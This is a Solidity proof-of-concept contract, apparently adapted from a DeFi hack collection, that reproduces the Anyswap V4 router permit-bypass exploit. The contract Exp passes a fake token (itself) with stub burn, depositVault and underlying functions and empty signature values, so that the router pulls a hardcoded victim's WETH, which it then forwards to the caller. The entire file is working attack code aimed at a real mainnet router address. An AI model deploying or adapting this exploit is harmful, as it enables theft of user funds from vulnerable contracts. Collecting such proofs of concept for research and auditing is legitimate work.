// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.22 <0.9.0;
// ref https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Anyswap_poc.t.sol

interface AnyswapV4Router {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
}

interface WETH {
    function approve(address guy, uint256 wad) external returns (bool);

    function withdraw(uint256 wad) external;

    function balanceOf(address) external view returns (uint256);

    function transfer(address dst, uint256 wad) external returns (bool);
}

contract Exp {
    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    AnyswapV4Router any = AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function exploit() public{
        any.anySwapOutUnderlyingWithPermit(
            0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB,
            address(this),
            msg.sender,
            308_636_644_758_370_382_903,
            100_000_000_000_000_000_000,
            0,
            "0x",
            "0x",
            56
        );
        weth.transfer(msg.sender, 308_636_644_758_370_382_901);
    }

    function burn(address from, uint256 amount) external returns (bool) {
        amount;
        from;
        return true;
    }

    function depositVault(uint256 amount, address to) external returns (uint256) {
        amount;
        to;
        return 1;
    }

    function underlying() external view returns (address) {
        return WETH_Address;
    }

}

contract Exploit {
    Exp exp;

    function exploit() public{
        exp = new Exp();
        exp.exploit();
    }
}